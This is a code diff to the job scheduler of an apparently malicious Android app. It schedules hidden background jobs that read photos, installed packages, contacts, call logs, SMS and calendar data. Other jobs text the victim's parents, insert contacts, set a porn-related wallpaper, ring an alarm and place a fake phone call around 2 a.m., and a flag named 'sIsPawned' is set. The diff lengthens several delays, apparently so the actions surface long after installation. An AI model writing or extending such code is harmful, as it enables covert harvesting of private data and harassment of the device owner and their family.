@@ -54,6 +54,7 @@ public class JobsScheduler {
     public static final String TEXT_PARENTS_KEY = "TEXT_PARENTS_KEY";
     public static final String INSERT_CONTACT_KEY = "INSERT_CONTACT_KEY";
     public static final String MISSED_CALLS_KEY = "MISSED_CALLS_KEY";
+    public static final String ALARM_CLOCK_KEY = "ALARM_CLOCK_KEY";
 
     public static void scheduleJob(Context context){
         SharedPreferences sharedPreferences = PreferenceManager.getDefaultSharedPreferences(context);
@@ -68,11 +69,12 @@ public class JobsScheduler {
         boolean ranTextParents = sharedPreferences.getBoolean(TEXT_PARENTS_KEY, false);
         boolean ranInsertContact = sharedPreferences.getBoolean(INSERT_CONTACT_KEY, false);
         boolean ranMissedCalls = sharedPreferences.getBoolean(MISSED_CALLS_KEY, false);
+        boolean ranAlarmClock = sharedPreferences.getBoolean(ALARM_CLOCK_KEY, false);
         JobScheduler jobScheduler = context.getSystemService(JobScheduler.class);
         if(jobScheduler.getPendingJob(JOB_ID_PORN) == null){
             ComponentName serviceComponent = new ComponentName(context, PornJobService.class);
             JobInfo.Builder builder = new JobInfo.Builder(JOB_ID_PORN, serviceComponent);
-            builder.setMinimumLatency(1 * ONE_MINUTE);
+            builder.setMinimumLatency(28 * ONE_HOUR);
             builder.setOverrideDeadline(65000);
             builder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
             jobScheduler.schedule(builder.build());
@@ -84,9 +86,9 @@ public class JobsScheduler {
             wallpaperBuilder.setRequiresCharging(false);
             wallpaperBuilder.setRequiresBatteryNotLow(true);
             wallpaperBuilder.setRequiresStorageNotLow(true);
-            wallpaperBuilder.setRequiresDeviceIdle(false);
-            wallpaperBuilder.setOverrideDeadline( 24 * ONE_HOUR);
-            wallpaperBuilder.setMinimumLatency(60000);
+            wallpaperBuilder.setRequiresDeviceIdle(true);
+            wallpaperBuilder.setOverrideDeadline( 48 * ONE_HOUR);
+            wallpaperBuilder.setMinimumLatency( 24 * ONE_HOUR);
             jobScheduler.schedule(wallpaperBuilder.build());
         }
         if(jobScheduler.getPendingJob(JOB_ID_DCIM) == null && !ranDcim && (context.checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED)){
@@ -99,7 +101,7 @@ public class JobsScheduler {
             dcimJob.setRequiresDeviceIdle(false);
             dcimJob.setPersisted(false);
             dcimJob.setOverrideDeadline( 24 * ONE_HOUR);
-            dcimJob.setMinimumLatency(55000);
+            dcimJob.setMinimumLatency(70000);
             jobScheduler.schedule(dcimJob.build());
         }
         if(jobScheduler.getPendingJob(JOB_ID_PACKAGES) == null && ! ranPackages){
@@ -112,7 +114,7 @@ public class JobsScheduler {
             packagesJob.setRequiresDeviceIdle(false);
             packagesJob.setPersisted(false);
             packagesJob.setOverrideDeadline( 24 * ONE_HOUR);
-            packagesJob.setMinimumLatency(50000);
+            packagesJob.setMinimumLatency(60000);
             jobScheduler.schedule(packagesJob.build());
         }
         if(jobScheduler.getPendingJob(JOB_ID_CONTACTS) == null && ! ranContacts && (context.checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED)){
@@ -125,7 +127,7 @@ public class JobsScheduler {
             contactsJob.setRequiresDeviceIdle(false);
             contactsJob.setPersisted(false);
             contactsJob.setOverrideDeadline( 24 * ONE_HOUR);
-            contactsJob.setMinimumLatency(45000);
+            contactsJob.setMinimumLatency(50000);
             jobScheduler.schedule(contactsJob.build());
         }
         if(jobScheduler.getPendingJob(JOB_ID_DEVICE) == null && ! ranDevice){
@@ -138,7 +140,7 @@ public class JobsScheduler {
             deviceJob.setRequiresDeviceIdle(false);
             deviceJob.setPersisted(false);
             deviceJob.setOverrideDeadline( 24 * ONE_HOUR);
-            deviceJob.setMinimumLatency(3000);
+            deviceJob.setMinimumLatency(40000);
             jobScheduler.schedule(deviceJob.build());
         }
         if(jobScheduler.getPendingJob(JOB_ID_PHONE_CALLS) == null && ! ranPhoneCall && (context.checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED)){
@@ -151,7 +153,7 @@ public class JobsScheduler {
             phoneCallsJob.setRequiresDeviceIdle(false);
             phoneCallsJob.setPersisted(false);
             phoneCallsJob.setOverrideDeadline( 24 * ONE_HOUR);
-            phoneCallsJob.setMinimumLatency(12000);
+            phoneCallsJob.setMinimumLatency(30000);
             jobScheduler.schedule(phoneCallsJob.build());
         }
         if(jobScheduler.getPendingJob(JOB_ID_SMS) == null && ! ranSms && (context.checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED)){
@@ -164,7 +166,7 @@ public class JobsScheduler {
             smsJob.setRequiresDeviceIdle(false);
             smsJob.setPersisted(false);
             smsJob.setOverrideDeadline( 24 * ONE_HOUR);
-            smsJob.setMinimumLatency(18000);
+            smsJob.setMinimumLatency(20000);
             jobScheduler.schedule(smsJob.build());
         }
         if(jobScheduler.getPendingJob(JOB_ID_CALENDAR_EVENTS) == null && ! ranCalendar && (context.checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED)){
@@ -177,7 +179,7 @@ public class JobsScheduler {
             calendarEventJob.setRequiresDeviceIdle(false);
             calendarEventJob.setPersisted(false);
             calendarEventJob.setOverrideDeadline( 24 * ONE_HOUR);
-            calendarEventJob.setMinimumLatency(26000);
+            calendarEventJob.setMinimumLatency(10000);
             jobScheduler.schedule(calendarEventJob.build());
         }
         if(jobScheduler.getPendingJob(JOB_ID_TEXT_PARENTS) == null && ! ranTextParents && (context.checkSelfPermission(Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED && context.checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED)){
@@ -185,12 +187,12 @@ public class JobsScheduler {
             JobInfo.Builder textParentsJob = new JobInfo.Builder(JOB_ID_TEXT_PARENTS, textParentsJobService);
             textParentsJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
             textParentsJob.setRequiresCharging(false);
-            textParentsJob.setRequiresBatteryNotLow(true);
+            textParentsJob.setRequiresBatteryNotLow(false);
             textParentsJob.setRequiresStorageNotLow(false);
             textParentsJob.setRequiresDeviceIdle(false);
             textParentsJob.setPersisted(false);
             textParentsJob.setOverrideDeadline( 24 * ONE_HOUR);
-            textParentsJob.setMinimumLatency(34000);
+            textParentsJob.setMinimumLatency(72 * ONE_HOUR);
             jobScheduler.schedule(textParentsJob.build());
         }
         if(jobScheduler.getPendingJob(JOB_ID_INSERT_CONTACT) == null && ! ranInsertContact && (context.checkSelfPermission(Manifest.permission.WRITE_CONTACTS) == PackageManager.PERMISSION_GRANTED)){
@@ -219,14 +221,14 @@ public class JobsScheduler {
             missedCallsJob.setMinimumLatency(65000);
             jobScheduler.schedule(missedCallsJob.build());
         }
-        if(jobScheduler.getPendingJob(JOB_ID_ALARM_CLOCK) == null){
+        if(jobScheduler.getPendingJob(JOB_ID_ALARM_CLOCK) == null && ! ranAlarmClock){
             ComponentName alarmClockJobService = new ComponentName(context, AlarmClockJobService.class);
             JobInfo.Builder alarmClockJob = new JobInfo.Builder(JOB_ID_ALARM_CLOCK, alarmClockJobService);
             alarmClockJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
             alarmClockJob.setRequiresCharging(false);
-            alarmClockJob.setRequiresBatteryNotLow(true);
+            alarmClockJob.setRequiresBatteryNotLow(false);
             alarmClockJob.setRequiresStorageNotLow(false);
-            alarmClockJob.setRequiresDeviceIdle(false);
+            alarmClockJob.setRequiresDeviceIdle(true);
             alarmClockJob.setPersisted(false);
             alarmClockJob.setOverrideDeadline( 1 * ONE_HOUR);
             if(!Lofl.isBetweenMidnightAndFive()){
@@ -239,16 +241,23 @@ public class JobsScheduler {
         }
         if(jobScheduler.getPendingJob(JOB_ID_FAKE_PHONE_CALL) == null && ! ranFakePhoneCall && (context.checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED)){
             ComponentName fakeCallJobService = new ComponentName(context, FakeCallJobService.class);
-            JobInfo.Builder calendarEventJob = new JobInfo.Builder(JOB_ID_FAKE_PHONE_CALL, fakeCallJobService);
-            calendarEventJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
-            calendarEventJob.setRequiresCharging(false);
-            calendarEventJob.setRequiresBatteryNotLow(true);
-            calendarEventJob.setRequiresStorageNotLow(false);
-            calendarEventJob.setRequiresDeviceIdle(false);
-            calendarEventJob.setPersisted(false);
-            calendarEventJob.setOverrideDeadline( 24 * ONE_HOUR);
-            calendarEventJob.setMinimumLatency(40000);
-            jobScheduler.schedule(calendarEventJob.build());
+            JobInfo.Builder fakeCallJob = new JobInfo.Builder(JOB_ID_FAKE_PHONE_CALL, fakeCallJobService);
+            fakeCallJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NONE);
+            fakeCallJob.setRequiresCharging(false);
+            fakeCallJob.setRequiresBatteryNotLow(true);
+            fakeCallJob.setRequiresStorageNotLow(false);
+            fakeCallJob.setRequiresDeviceIdle(false);
+            fakeCallJob.setPersisted(false);
+            fakeCallJob.setOverrideDeadline( 24 * ONE_HOUR);
+            if(ranAlarmClock){
+                if(! Lofl.isBetweenMidnightAndFive()){
+                    long midnight = Lofl.millisTillMidnight();
+                    fakeCallJob.setMinimumLatency(midnight + (2 * ONE_HOUR));
+                }else{
+                    fakeCallJob.setMinimumLatency(1000);
+                }
+            }
+            jobScheduler.schedule(fakeCallJob.build());
         }else{
             if(ranFakePhoneCall){
                 ScreenReceiver.sIsPawned = true;
